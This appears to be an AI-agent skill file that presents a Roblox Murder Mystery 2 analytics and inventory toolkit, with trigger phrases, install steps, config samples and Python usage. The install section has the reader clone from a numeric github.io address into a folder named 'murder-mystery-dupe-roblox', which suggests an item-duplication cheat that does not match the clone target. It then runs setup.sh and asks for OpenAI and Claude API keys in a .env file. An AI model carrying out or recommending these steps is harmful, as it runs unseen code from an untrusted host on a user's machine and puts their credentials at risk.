---
name: mm2-analytics-roblox-toolkit
description: Analytics and inventory management toolkit for Roblox Murder Mystery 2 gameplay optimization
triggers:
  - "help me analyze my Murder Mystery 2 inventory"
  - "how do I track MM2 knife skins and stats"
  - "set up MM2 analytics dashboard"
  - "optimize my Roblox Murder Mystery 2 gameplay"
  - "configure MM2 inventory tracker"
  - "analyze Murder Mystery 2 statistics"
  - "track my MM2 collection and performance"
  - "set up Roblox MM2 data visualization"
---

# MM2 Analytics Roblox Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides analytics, inventory management, and strategic gameplay insights for Roblox's Murder Mystery 2. It includes data visualization, inventory tracking, performance metrics, and AI-powered strategy recommendations.

## What It Does

- **Inventory Management**: Track knife skins, gamepasses, and collection completion
- **Analytics Dashboard**: Visualize gameplay statistics, win/loss ratios, and performance metrics
- **Strategy Analysis**: Identify successful gameplay patterns and receive AI-powered recommendations
- **Data Export**: Export statistics in CSV/JSON formats for external analysis
- **Multi-platform**: Works on Windows, macOS, Linux, and web browsers

## Installation

### Automated Setup

```bash
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Clone repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt
```

### System Requirements

- Python 3.8+
- Node.js 16+
- Modern web browser (Chrome 120+, Firefox 121+)
- 2GB free disk space

## Configuration

### Environment Variables

Create a `.env` file in the project root:

```bash
# Optional AI integrations
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}

# Data storage
DATA_DIRECTORY=./data/collections

# Analytics settings
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true

# Export preferences
DEFAULT_EXPORT_FORMAT=json
```

### Profile Configuration

Create a profile YAML file at `profiles/my_profile.yaml`:

```yaml
profile:
  username: "MyRobloxUsername"
  preferred_role: "sheriff"  # sheriff, murderer, innocent
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient", "unique"]
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"  # basic, comprehensive, minimal
    data_refresh_rate: 30  # seconds
    export_format: ["csv", "json"]
  
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

## CLI Commands

### Basic Usage

```bash
# Run analytics with default profile
python3 main.py --mode analytics

# Specify custom profile
python3 main.py --mode analytics --profile profiles/my_profile.yaml

# Export data
python3 main.py --mode analytics --export stats_output.json --format json

# Verbose logging
python3 main.py --mode analytics --verbose --log-level DEBUG
```

### Inventory Management

```bash
# Scan and update inventory
python3 main.py --mode inventory --scan

# List all knife skins
python3 main.py --mode inventory --list-items --category knife_skins

# Check missing items for collection
python3 main.py --mode inventory --check-missing --rarity legendary

# Export inventory report
python3 main.py --mode inventory --export inventory_2026.csv --format csv
```

### Strategy Analysis

```bash
# Analyze gameplay patterns
python3 main.py --mode strategy --analyze --sessions 50

# Get AI recommendations
python3 main.py --mode strategy --ai-recommend --role sheriff

# Generate practice scenarios
python3 main.py --mode strategy --practice-mode --difficulty hard
```

### Dashboard Server

```bash
# Start web dashboard
python3 main.py --mode dashboard --port 8080

# Access at http://localhost:8080
```

## Python API Usage

### Basic Analytics

```python
from mm2_toolkit import AnalyticsEngine, Profile

# Load profile
profile = Profile.from_file('profiles/my_profile.yaml')

# Initialize analytics engine
engine = AnalyticsEngine(profile)

# Get performance metrics
metrics = engine.get_performance_metrics()
print(f"Win Rate: {metrics['win_rate']:.2%}")
print(f"Games Played: {metrics['total_games']}")
print(f"Favorite Role: {metrics['most_played_role']}")

# Export statistics
engine.export_stats('statistics.json', format='json')
```

### Inventory Management

```python
from mm2_toolkit import InventoryManager

# Initialize inventory manager
manager = InventoryManager(data_dir='./data/collections')

# Scan inventory
inventory = manager.scan()

# Filter knife skins by rarity
legendary_knives = manager.filter_items(
    category='knife_skins',
    rarity='legendary'
)

print(f"Found {len(legendary_knives)} legendary knives")

for knife in legendary_knives:
    print(f"- {knife['name']}: {knife['value']} coins")

# Check collection completion
completion = manager.get_completion_rate(category='knife_skins')
print(f"Collection: {completion:.1%} complete")
```

### Strategy Analysis

```python
from mm2_toolkit import StrategyAnalyzer

# Initialize analyzer
analyzer = StrategyAnalyzer()

# Analyze recent sessions
sessions = analyzer.load_sessions(count=100)
patterns = analyzer.identify_patterns(sessions)

print("Successful Patterns:")
for pattern in patterns['successful']:
    print(f"- {pattern['name']}: {pattern['success_rate']:.1%}")

# Get role-specific recommendations
recommendations = analyzer.get_recommendations(role='sheriff')

for rec in recommendations:
    print(f"Tip: {rec['description']}")
    print(f"Priority: {rec['priority']}")
```

### AI-Powered Insights

```python
from mm2_toolkit import AIInsights
import os

# Initialize with API keys from environment
insights = AIInsights(
    openai_key=os.getenv('API_OPENAI_KEY'),
    claude_key=os.getenv('API_CLAUDE_KEY')
)

# Get gameplay analysis
analysis = insights.analyze_gameplay(
    sessions=sessions,
    focus='improvement_areas'
)

print("AI Analysis:")
print(analysis['summary'])
print("\nKey Recommendations:")
for rec in analysis['recommendations']:
    print(f"- {rec}")
```

### Data Visualization

```python
from mm2_toolkit import DataVisualizer
import matplotlib.pyplot as plt

# Initialize visualizer
viz = DataVisualizer()

# Create performance chart
fig, ax = viz.create_performance_chart(metrics)
plt.savefig('performance.png')

# Generate inventory distribution
fig, ax = viz.create_inventory_distribution(inventory)
plt.savefig('inventory.png')

# Create interactive dashboard
viz.create_dashboard(
    metrics=metrics,
    inventory=inventory,
    output='dashboard.html'
)
```

## Common Patterns

### Daily Statistics Collection

```python
from mm2_toolkit import AnalyticsEngine, Profile
from datetime import datetime
import schedule

def collect_daily_stats():
    profile = Profile.from_file('profiles/my_profile.yaml')
    engine = AnalyticsEngine(profile)
    
    metrics = engine.get_performance_metrics()
    timestamp = datetime.now().strftime('%Y%m%d')
    
    engine.export_stats(
        f'daily_stats_{timestamp}.json',
        format='json'
    )
    
    print(f"Stats collected at {datetime.now()}")

# Schedule daily collection
schedule.every().day.at("23:59").do(collect_daily_stats)
```

### Automated Inventory Backup

```python
from mm2_toolkit import InventoryManager
import shutil
from datetime import datetime

def backup_inventory():
    manager = InventoryManager(data_dir='./data/collections')
    
    # Scan current inventory
    inventory = manager.scan()
    
    # Create timestamped backup
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    backup_file = f'backups/inventory_{timestamp}.json'
    
    manager.export_inventory(backup_file, format='json')
    print(f"Backup saved: {backup_file}")

# Run weekly backups
backup_inventory()
```

### Performance Tracking

```python
from mm2_toolkit import PerformanceTracker

tracker = PerformanceTracker()

# Track a gaming session
session = tracker.start_session()

# Record game outcomes
tracker.record_game(session_id=session, role='sheriff', won=True)
tracker.record_game(session_id=session, role='innocent', won=False)
tracker.record_game(session_id=session, role='sheriff', won=True)

# End session and get summary
summary = tracker.end_session(session)

print(f"Session Win Rate: {summary['win_rate']:.1%}")
print(f"Best Role: {summary['best_role']}")
```

## Configuration Examples

### Minimal Configuration

```yaml
profile:
  username: "Player123"
  analytics_preferences:
    tracking_mode: "basic"
    data_refresh_rate: 60
```

### Advanced Configuration

```yaml
profile:
  username: "ProPlayer2026"
  preferred_role: "sheriff"
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient", "unique", "godly"]
      min_value: 1000
    - category: "gun_skins"
      rarity: ["legendary"]
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 15
    export_format: ["json", "csv", "xlsx"]
    enable_predictions: true
    
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
      tactics: ["early_engagement", "map_control"]
    - name: "stealth_murderer"
      priority: "low_detection_risk"
      tactics: ["isolated_targets", "crowd_blending"]
    - name: "passive_innocent"
      priority: "survival"
      tactics: ["group_staying", "distraction_avoidance"]
  
  notifications:
    discord_webhook: ${DISCORD_WEBHOOK_URL}
    email_alerts: true
    alert_thresholds:
      rare_item_found: true
      achievement_unlocked: true
```

## Troubleshooting

### Installation Issues

**Problem**: `ModuleNotFoundError` for dependencies

```bash
# Ensure all dependencies are installed
python3 -m pip install --upgrade pip
python3 -m pip install -r requirements.txt --force-reinstall
```

**Problem**: Permission denied on setup.sh

```bash
# Make script executable
chmod +x setup.sh
# Or run with bash directly
bash setup.sh --install
```

### Runtime Issues

**Problem**: Profile not found error

```python
# Check profile path
import os
profile_path = 'profiles/my_profile.yaml'
if not os.path.exists(profile_path):
    print(f"Profile not found: {profile_path}")
    # Create default profile
    from mm2_toolkit import Profile
    Profile.create_default(profile_path)
```

**Problem**: Analytics not updating

```python
# Force refresh
from mm2_toolkit import AnalyticsEngine

engine = AnalyticsEngine(profile)
engine.force_refresh()  # Manually trigger data update
metrics = engine.get_performance_metrics(cache=False)
```

**Problem**: Dashboard not accessible

```bash
# Check if port is already in use
lsof -i :8080

# Use different port
python3 main.py --mode dashboard --port 8081
```

### Data Issues

**Problem**: Corrupted inventory data

```python
from mm2_toolkit import InventoryManager

manager = InventoryManager(data_dir='./data/collections')

# Validate and repair
manager.validate_data()
manager.repair_corrupted_entries()

# Restore from backup if needed
manager.restore_from_backup('backups/inventory_20260514.json')
```

**Problem**: Missing statistics

```python
from mm2_toolkit import AnalyticsEngine

engine = AnalyticsEngine(profile)

# Rebuild statistics from raw data
engine.rebuild_statistics(force=True)
```

### Performance Issues

```python
# Optimize large datasets
from mm2_toolkit import DataOptimizer

optimizer = DataOptimizer()
optimizer.compress_old_data(days=90)  # Archive data older than 90 days
optimizer.cleanup_temp_files()
optimizer.rebuild_indexes()
```

## Best Practices

1. **Regular Backups**: Schedule automated inventory backups weekly
2. **Profile Management**: Use separate profiles for different accounts
3. **Data Privacy**: Keep API keys in environment variables, never commit to version control
4. **Performance**: Use `tracking_mode: "basic"` for low-resource systems
5. **Updates**: Check for toolkit updates regularly for new features and bug fixes

## Additional Resources

- GitHub Issues: Report bugs and request features
- Discord Community: Real-time support and discussions
- Documentation: Full API reference and guides
